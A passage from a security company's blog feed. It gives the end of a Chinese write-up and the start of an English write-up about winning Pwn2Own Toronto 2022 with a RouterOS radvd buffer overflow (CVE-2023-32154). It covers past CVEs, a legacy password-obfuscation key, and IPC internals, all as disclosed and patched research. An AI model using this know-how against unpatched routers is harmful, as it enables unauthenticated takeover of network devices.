  &lt;li&gt;在新增/刪除 remote object 時，使用了 non-blocking 的方法&lt;/li&gt;
  &lt;li&gt;有訂閱 remote object&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;透過這類型的漏洞，攻擊者可以將兩次請求的結果混合成一個回傳，或許可以作為一個用來繞過某些安全性檢查的手法。如果順利找到可利用的漏洞，我們還可以用來參加 Pwn2Own 當中的 router  類別中的 LAN 項目。&lt;/p&gt;

&lt;p&gt;然而最後時間緊迫，我們並沒有透過 race condition 找到可以利用的漏洞。而且禍不單行，在報名準備截止時，我們才發現這幾個月來被我們測試了上百次的 exploit 存在一些問題，就在報名截止的三個小時前像鬼打牆一樣，怎麼打怎麼失敗，簡直就是數位世代的逢魔時刻，我們一直更新 exploit 並且不斷更新準備上交的漏洞白皮書，一直到報名前止的半小時前（凌晨四點截止）才順利完成。&lt;/p&gt;

&lt;p&gt;但是非常幸運的，我們在賽中僅嘗試一次就順利的完成了攻擊，成為 Pwn2Own 歷史上第一組完成 SOHO SMASHUP 這個新類別的隊伍：&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/78.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;我們在這個項目中獲得了 10 點 Master of Pwn 點數還有 $100,000 美金的獎金，最終在比賽結算時，DEVCORE 以 18.5 個 Master of Pwn 點數奪下冠軍。&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/79.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;冠軍除了獲得 Master of Pwn 的頭銜、獎杯、外套之外，照慣例，主辦方還會各寄一台我們打下的設備過來。&lt;/p&gt;

&lt;p&gt;（我們沒辦法把所有東西都塞進相框裡）
&lt;img src=&quot;/assets/img/blog/20240524/80.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;結論&quot;&gt;結論&lt;/h2&gt;

&lt;p&gt;在本次研究中，我們對 RouterOS 進行了深入探討，進而揭露了一個潛藏在 RouterOS 內長達九年的安全漏洞，並成功利用該漏洞在 Pwn2Own Toronto 2022 的賽事中奪下 SOHO SMASHUP 的項目。此外，我們還在 IPC 中發現了一種導致 race condition 的行為模式。最後，我們也將賽事中使用的工具開源於 https://github.com/terrynini/routeros-tools ，供大家參考。&lt;/p&gt;

&lt;p&gt;通過本次研究及分享，DEVCORE 希望分享我們的發現和經驗，從而協助白帽駭客深入了解 RouterOS，使之變得更加透明易懂。&lt;/p&gt;
</description>
                <link>https://devco.re/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros/</link>
                <guid>https://devco.re/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros</guid>
                <pubDate>Fri, 24 May 2024 00:00:00 +0800</pubDate>
        </item>

        <item>
                <title>Pwn2Own Toronto 2022 : A 9-year-old bug in MikroTik RouterOS</title>
                <description>&lt;p&gt;&lt;a href=&quot;/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros-en/&quot;&gt;English Version&lt;/a&gt;, &lt;a href=&quot;/blog/2024/05/24/pwn2own-toronto-2022-a-9-year-old-bug-in-mikrotik-routeros/&quot;&gt;中文版本&lt;/a&gt;&lt;/p&gt;

&lt;h2 id=&quot;tldr&quot;&gt;TL;DR&lt;/h2&gt;

&lt;p&gt;DEVCORE research team found a 9-year-old WAN bug on RouterOS, the product of MikroTik. Combined with another bug of the Canon printer, DEVCORE becomes the first team ever to successfully complete an attack chain in the brand new SOHO Smashup category of Pwn2Own. And DEVCORE also won the title of Master of Pwn in Pwn2Own Toronto 2022.&lt;/p&gt;

&lt;p&gt;The vulnerability occurs in the radvd of RouterOS, which does not check the length of the RDNSS field when processing ICMPv6 packets for IPv6 SLAAC. As a result, an attacker can trigger the buffer overflow by sending two crafted Router Advertisement packets, that allows an attacker to gain full control over the underlying Linux system of the router without logging in and without user interaction. This vulnerability was assigned as CVE-2023-32154 with a CVSS score of 7.5.&lt;/p&gt;

&lt;p&gt;The vulnerability was reported to MikroTik by &lt;a href=&quot;https://www.zerodayinitiative.com/advisories/ZDI-23-710/&quot;&gt;ZDI&lt;/a&gt; on 2022/12/29 and patched on 2023/05/19. It has been patched in the following RouterOS releases:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Long-term Release 6.48.7&lt;/li&gt;
  &lt;li&gt;Stable Release 6.49.8&lt;/li&gt;
  &lt;li&gt;Stable Release 7.10&lt;/li&gt;
  &lt;li&gt;Testing Release 7.10rc6&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;pwn2own-soho-smashup&quot;&gt;Pwn2Own SOHO Smashup&lt;/h2&gt;

&lt;p&gt;Pwn2Own is a series of contests organized by The Trend Micro Zero Day Initiative (ZDI). They pick popular products as targets for different categories, such as: operating systems, browsers, electric cars, industrial control systems, routers, printers, smart speakers, smartphones, NAS, webcams, etc.&lt;/p&gt;

&lt;p&gt;As long as the participants can exploit a target without user interaction while the device is in its default state and the software is updated to the latest version, the team will receive the corresponding Master of Pwn points and bounty. And the team which has the highest Master of Pwn points will be the winner, who is also known as the “Master of Pwn.”&lt;/p&gt;

&lt;p&gt;Due to the epidemic, Work From Home or SOHO (Small Office/Home Office) has become very common. Consider that, the Pwn2Own Toronto 2022 has  a special category called SOHO Smashup, in which participants need to hack routers from the WAN side, and then use the router as a trampoline to attack common household devices in LAN, such as smart speakers, printers, etc.&lt;/p&gt;

&lt;p&gt;In addition to the second highest prize of $100,000 (USD), the SOHO Smashup also has the highest score of 10, so if you’re aiming to win, you’ll want to complete this category! We’ve also chosen the lesser-explored MikroTik’s RouterBoard as the target to avoid bug collisions with others (both the bounty and score are halved when you have a collision with someone else).&lt;/p&gt;

&lt;h2 id=&quot;routeros&quot;&gt;RouterOS&lt;/h2&gt;

&lt;p&gt;The RouterOS is based on the Linux kernel and it’s also the default operating system of MikroTik’s RouterBoard. It can also be installed on a PC to turn it into a router.&lt;/p&gt;

&lt;p&gt;Though the RouterOS do use some GPL-License software, according to the &lt;a href=&quot;https://web.archive.org/web/20220603140018/https://mikrotik.com/downloadterms.html&quot;&gt;downloadterms&lt;/a&gt; page from MikroTik’s website, you have to pay $45 to MikroTik for sending a CD with GPL source, very interesting.&lt;/p&gt;

&lt;p&gt;Glad that there is already a nice guy who uploaded the &lt;a href=&quot;https://github.com/robimarko/routeros-GPL&quot;&gt;GPL source on the Github&lt;/a&gt;, though they didn’t help much on reversing the RouterOS.&lt;/p&gt;

&lt;h3 id=&quot;routeros-v7-and-routeros-v6&quot;&gt;RouterOS v7 and RouterOS v6&lt;/h3&gt;

&lt;p&gt;There are two versions of RouterOS on the download page of MikroTik’s website: RouterOS v7 and RouterOS v6. They are more like two branches of the RouterOS and share a similar design pattern. Because the default installed version of our target, RB2011UiAS-IN, is RouterOS v6, we focus on that version.
&lt;img src=&quot;/assets/img/blog/20240524/1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;RouterOS does not provide a formal way for users to manipulate the underlying Linux system, and users are trapped in a restricted console with a limited number of commands to manage the router, so there has been a lot of research on how to jailbreak RouterOS.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The binary on the RouterOS uses a customized IPC to communicate with each other, and the IPC uses the “nova message” format to pack messages. So we call such kinds of binary “nova binary” afterward.&lt;/p&gt;

&lt;p&gt;Besides, the RouterOS has a special attack surface. The user can manage a RouterOS device remotely from a Windows computer with a GUI tool, WinBox, by sending a nova message through the TCP. So, if the RouterOS fails to validate the privilege of a nova message, the attacker can possibly invade the router by sending a crafted nova message from remote, but it’s not a top priority  because the WinBox is unavailable from WAN by default.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;review-of-related-cves&quot;&gt;Review of Related CVEs&lt;/h2&gt;

&lt;p&gt;We started by reviewing the CVEs in the past few years. There were 80 CVEs related to RouterOS at that time, of which 28 targeted the router itself in pre-auth scenarios.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/4.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;4 out of the 28 CVEs are in scenarios that are more in line with the Pwn2Own rules, which means these vulnerabilities could allow an attacker to spawn a shell on the router or log in as admin without user interaction. Three of the vulnerabilities were discovered between 2017 and 2019, and three of these were discovered “in the wild.” These four vulnerabilities are:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;CVE-2017-20149: Also known as Chimay-Red, this is one of the leaked vulnerabilities from the CIA’s “Vault 7” in 2017. The vulnerability occurs when RouterOS parses HTTP requests, and if the Content-Length in the HTTP headers is negative, it will cause Integer Underflow, which together with the Stack Clash attack technique can control the program flow to achieve RCE.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1&quot;&gt;CVE-2018-7445&lt;/a&gt;: A buffer overflow in the SMB service of RouterOS, which found by black-box fuzzing and is the only one of the four vulnerabilities that was reported by the discoverer. Though the SMB is not  enabled defaultly.&lt;/li&gt;
  &lt;li&gt;CVE-2018-14847: Also the one of the leaked vulnerabilities from the “Vault 7”, which could allow an attacker to achieve arbitrary file read. Which doesn’t sound like a big problem, but because in the earlier version of RouterOS, the user’s password was stored in a file as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;password xor md5(username + &quot;283i4jfkai3389&quot;)&lt;/code&gt;, the attacker can calculate the password of admin as long as the attacker can read the file.&lt;/li&gt;
  &lt;li&gt;&lt;a href=&quot;https://teamt5.org/en/posts/vulnerability-mikrotik-cve-2021-41987/&quot;&gt;CVE-2021-41987&lt;/a&gt;：A heap buffer overflow vulnerability in the base64 decoding process of the SCEP service due to a length miscalculation. The vulnerability was discovered after security researchers analyzed an APT’s exploit on its C2 server.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;As we can see, most of these vulnerabilities are “in the wild.” We can only learn limited knowledge about analyzing and reversing the RouterOS.&lt;/p&gt;

&lt;h2 id=&quot;review-of-related-research&quot;&gt;Review of Related Research&lt;/h2&gt;

&lt;p&gt;We continue to seek out publicly available research materials, and we have these articles and presentations available at the time of the competition:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;2017
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://kirils.org/slides/2017-08-06_prez_SHA_MT_pub.pdf&quot;&gt;Kirils. Rooting the MikroTik routers&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Mainly about jailbreak&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://kirils.org/slides/2017-09-15_prez_15_MT_Balccon_pub.pdf&quot;&gt;Kirils. A deeper journey into MikroTik routers&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Mainly about jailbreak&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://kirils.org/slides/2017-10-21_MT_Hacktivity_pub.pdf&quot;&gt;Kirils. Tools for effortless reverse engineering of MikroTik routers&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Mainly about jailbreak&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2018
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://github.com/tenable/routeros&quot;&gt;Jacob Baines. Bug Hunting in RouterOS&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Explaining how nova message works in IPC&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2019
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/make-it-rain-with-mikrotik-c90705459bc6&quot;&gt;Jacob Baines. Make It Rain with MikroTik&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Identical to the talk in 2018&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/mikrotik-firewall-nat-bypass-b8d46398bf24&quot;&gt;Jacob Baines. MikroTik Firewall &amp;amp; NAT Bypass&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;A vulnerability in WinBox: it can be used to scan the intranet once it’s exposed to the WAN&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/@maxi./finding-and-exploiting-cve-2018-7445-f3103f163cc1&quot;&gt;Maximiliano Vidal, Juan Caillava. Finding and exploiting CVE-2018–7445&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Found buffer overflow in SMB by black-box fuzzing and how to exploit the vulnerability to get shell&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://mum.mikrotik.com/presentations/ID18/presentation_6149_1540240927.pdf&quot;&gt;Tomas Kirnak. Deep-dive: MikroTik exploits - a security analysis&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Discussing the mass exploit event after the leakage of CIA’s “Vault7” arsenal&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://media.defcon.org/DEF%20CON%2027/DEF%20CON%2027%20presentations/DEFCON-27-Jacob-Baines-Help-Me-Vulnerabilities.-Youre-My-Only-Hope.pdf&quot;&gt;Jacob Baines. Help Me Vulnerabilities You’re My Only Hope&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Release a tool for jailbreaking RouterOS to help user to check if their router has been compromised in the mass exploit event&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://medium.com/tenable-techblog/routeros-chain-to-root-f4e0b07c0b21&quot;&gt;Jacob Baines. RouterOS: Chain to Root&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Get shell by chaining DNS poisoning and downgrade vulnerabilities&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
  &lt;li&gt;2022
    &lt;ul&gt;
      &lt;li&gt;&lt;a href=&quot;https://teamt5.org/en/posts/vulnerability-mikrotik-cve-2021-41987/&quot;&gt;D39. Vulnerability Exposure &amp;amp; Notification on Mikrotik (CVE-2021-41987)&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Found an exploit contains 0-day that targets RouterOS on an APT’s C2 server&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://margin.re/2022/06/pulling-mikrotik-into-the-limelight/&quot;&gt;Ian Dupont, Harrison Green. Pulling MikroTik into the Limelight&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Detail the IPC mechanism of the RouterOS and release a jailbreak tool “FOISted” to help researchers do further research on the amd64 version of RouterOS.&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
      &lt;li&gt;&lt;a href=&quot;https://powerofcommunity.net/poc2022/QianChen.pdf&quot;&gt;Qian Chen. MikroTik RouterOS Security: The Forgotten IPC Message&lt;/a&gt;
        &lt;ul&gt;
          &lt;li&gt;Found several vulnerabilities in IPC by fuzzing&lt;/li&gt;
        &lt;/ul&gt;
      &lt;/li&gt;
    &lt;/ul&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&quot;review-of-the-ipc-and-the-nova-message&quot;&gt;Review of the IPC and the Nova Message&lt;/h2&gt;

&lt;p&gt;Most of the research centers around RouterOS’s homebrew IPC, so we also took some time to review it. Here is a simple example to explain the main idea of the IPC.&lt;/p&gt;

&lt;p&gt;Normally, a user can log in to the RouterOS through telnet, and manage the router by console.
&lt;img src=&quot;/assets/img/blog/20240524/5.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s follow the procedure step by step:&lt;/p&gt;

&lt;ol&gt;
  &lt;li&gt;When the user tries to access the console of RouterOS through the telnet. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;telnet&lt;/code&gt; process will spawn the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;execl&lt;/code&gt;, which asks the user for account and password.
&lt;img src=&quot;/assets/img/blog/20240524/6.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;After getting the account and password, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; would pack that info into a nova message, and send it to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process for authentication.
&lt;img src=&quot;/assets/img/blog/20240524/7.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process returns the result by sending back a nova message
&lt;img src=&quot;/assets/img/blog/20240524/8.png&quot; alt=&quot;&quot; /&gt;&lt;/li&gt;
  &lt;li&gt;If the login succeeds, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;console&lt;/code&gt; process is spawned, and the user interaction with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;console&lt;/code&gt; is actually proxied through the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process.&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&quot;ipc&quot;&gt;IPC&lt;/h3&gt;

&lt;p&gt;The above example simply describes the basic concept of IPC, but the communication between the two processes is actually more complex.&lt;/p&gt;

&lt;p&gt;Every nova message would be sent to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loader&lt;/code&gt; process through the socket first, then the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loader&lt;/code&gt; dispatches each nova message to the corresponding nova binary.&lt;/p&gt;

&lt;p&gt;Suppose the id of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process is 1039, the id of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process is 13, and the handler with id 4 in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process is responsible for verifying the account and password.&lt;/p&gt;

&lt;p&gt;Firstly, the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process sends a request with an account and password to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process, so the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; in nova message is an array with two elements &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;13, 4&lt;/code&gt;, which means that the message should be sent to the handler with id 4 in the process with binary id 13.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/9.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;loader&lt;/code&gt; receives the message, it will remove the 13 in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; of the message which represents the target binary id, and add the source binary id in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_FROM&lt;/code&gt;, which is 1039, and then send the message to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/10.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;user&lt;/code&gt; process does a similar thing when it receives a message: removing the 4 from &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; that represents the target handler id and sending the nova message to handler 4 for processing.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/11.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;nova-message&quot;&gt;Nova Message&lt;/h3&gt;

&lt;p&gt;The nova message used in IPC is initialized and set by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::message&lt;/code&gt; and related functions. Nova message is composed of typed key-value pairs, and the key can only be an integer, so keys such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_FROM&lt;/code&gt; are just simple macros.&lt;/p&gt;

&lt;p&gt;The types that can be used in a nova message include u32, u64, bool, string, bytes, IP and nova message (i.e. you can create a nested nova message).&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/12.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Because the RouterOS doesn’t use nova messages in JSON anymore, we only focus on the binary format of it.&lt;/p&gt;

&lt;p&gt;During IPC communication, the receiver’s socket receives an integer that expresses the length of the current nova message, followed by the nova message in binary format.
&lt;img src=&quot;/assets/img/blog/20240524/13.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The nova message starts with two magic bytes: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;M2&lt;/code&gt;. Next, each key is described by 4 bytes; the first 3 bytes are used to express the id of the key, and the last byte is the type of the key. Depending on the type, the next bytes will be parsed differently as data, and the next key will come after data, and so on. A special feature is that a bool can be represented by only one bit, so the lowest bit of the type is used to represent True/False. For a more detailed format, see &lt;a href=&quot;https://margin.re/2022/06/pulling-mikrotik-into-the-limelight/&quot;&gt;Ian Dupont, Harrison Green. Pulling MikroTik into the Limelight&lt;/a&gt;：
&lt;img src=&quot;/assets/img/blog/20240524/14.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-x3-format&quot;&gt;The x3 format&lt;/h3&gt;

&lt;p&gt;In order to understand which nova binary the ids in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; and the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_FROM&lt;/code&gt; in the nova message refer to, we need to parse a file with the extension x3, which is an xml in binary format. By parsing the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/nova/etc/loader/system.x3&lt;/code&gt; with the tool, we can map which nova binary each id corresponds to.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/15.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The id of some binaries are absent in this file, because some of them have been made available by installing an official RouterOS package. In which case the binary’s id will exist in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/ram/pckg/&amp;lt;package_name&amp;gt;/nova/etc/loader/&amp;lt;package_name&amp;gt;.x3&lt;/code&gt;. The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;radvd&lt;/code&gt; is an example.
&lt;img src=&quot;/assets/img/blog/20240524/16.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;However, there are still some id of binaries that cannot be found in any .x3 files because these types of processes are not persistent, e.g., the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;login&lt;/code&gt; process, which is only spawned when the user tries to log in and uses a serial number as its id.&lt;/p&gt;

&lt;p&gt;The .x3 file is also used to record nova binary related settings, e.g. &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;www&lt;/code&gt; specifies in .x3 which servlet should be used for each URI.
&lt;img src=&quot;/assets/img/blog/20240524/17.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;

&lt;p&gt;After reviewing the research and CVEs from the past, we can see that most vulnerabilities we are interested in have been concentrated in the past, and it seems to be difficult to find  pre-auth vulnerabilities on the WAN side of RouterOS nowadays.&lt;/p&gt;

&lt;p&gt;While vulnerabilities continue to be revealed, the RouterOS is becoming more and more secure. Is it true that there are no more pre-auth vulnerabilities on the RouterOS? Or maybe it’s just that everyone is missing something?&lt;/p&gt;

&lt;p&gt;Most of the public research mentioned earlier falls into the following three categories:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;Jailbreaking&lt;/li&gt;
  &lt;li&gt;The analysis of the exploits in the wild&lt;/li&gt;
  &lt;li&gt;The nova message in the IPC&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;However, after reversing the binary on RouterOS for a while, we realized that the complexity of the whole system was more than that, but no one mentioned the details. This led to the following thought: “No one with sanity would like to dive into the details of nova binary”.&lt;/p&gt;

&lt;p&gt;Aside from the exploits leaked from the CIA and APT, most of the research about finding vulnerabilities in RouterOS are: fuzzing network protocols, playing with nova messages, or performing fuzzing tests on nova messages.&lt;/p&gt;

&lt;p&gt;By the outcome, it seems that attackers understand the RouterOS much better than we do, and we need to explore more details about the nova binary to fill in the gaps and increase the possibility to find the vulnerabilities we are looking for. Don’t get me wrong. I don’t against fuzzing. But we must ensure we check everything essential to take advantage of the contest.&lt;/p&gt;

&lt;h2 id=&quot;where-to-begin&quot;&gt;Where to begin&lt;/h2&gt;

&lt;p&gt;We don’t think the RouterOS is flawless, there is a gap between researchers’ and attackers’ understanding of RouterOS. So, what are we missing to find pre-auth RCE on RouterOS?&lt;/p&gt;

&lt;p&gt;The first question that comes to mind is “where is the entry point of IPC and where does it lead?” Because most of the functionality triggered by IPC requires login, it is to be expected that sticking to IPC will only lead to more findings in post-auth. IPC is just one part of the main functionality implemented on RouterOS, and we would like to look at the core code of each functionality directly and carefully.&lt;/p&gt;

&lt;p&gt;For example, how do the process that deal with DHCP extract the info needed in a DHCP packet? This information may be stored directly in the process, or may need to be sent to other processes via IPC for further processing.
&lt;img src=&quot;/assets/img/blog/20240524/18.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-architecture-of-nova-binary&quot;&gt;The Architecture of Nova Binary&lt;/h3&gt;

&lt;p&gt;Hence, we must first understand the architecture of the nova binary. Each nova binary has an instance of the Looper class (or a derivative of it: MultifiberLooper), which is a class for event loop logic. In each iteration, it calls &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runTimer&lt;/code&gt; to execute the timer that is expired, and use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;poll&lt;/code&gt; to check the status of the sockets then process them accordingly.
&lt;img src=&quot;/assets/img/blog/20240524/19.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Looper is responsible for the communication between its nova binary and the loader. Looper first registers a special callback function: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;onMsgSock&lt;/code&gt;, which is responsible for dispatching the nova message received from the socket to the corresponding handler in the nova binary.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/20.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;the-handler-class-and-its-derivatives&quot;&gt;The Handler class and its derivatives&lt;/h3&gt;

&lt;p&gt;When a looper receives a nova message, it will dispatch it to the corresponding handler, e.g., a message with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[14, 0]&lt;/code&gt; will be dispatched by the loader to a nova binary with a binary id of 14. By the time the looper in the binary with a binary id of 14 receives it, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; has &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[0]&lt;/code&gt; left, so the looper will dispatch it to handler 0 for processing. If the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; in the initial nova message is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[14]&lt;/code&gt;, then the looper receives it with &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_TO&lt;/code&gt; as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[]&lt;/code&gt;, and the looper handles this message on its own.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/21.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now let’s assume that the Looper receives a nova message that should be handled by handler 1 and dispatches it to handler 1. At this point, handler 1 calls the methods &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;nv::Handler::handleCmd&lt;/code&gt; in the vtable of the handler class, which looks for the corresponding function to execute in the vtable based on the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SYS_CMD&lt;/code&gt; specified in the nova message.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/img/blog/20240524/22.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cmdUnknown&lt;/code&gt; in the vtable is often overridden to extend the functionality, but sometimes the developer overrides &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;handleCmd&lt;/code&gt; instead, depending on the developer’s mood. The handler class is a base class, so  commands related to objects are not implemented.&lt;/p&gt;

&lt;h3 id=&quot;derived-class&quot;&gt;Derived class&lt;/h3&gt;

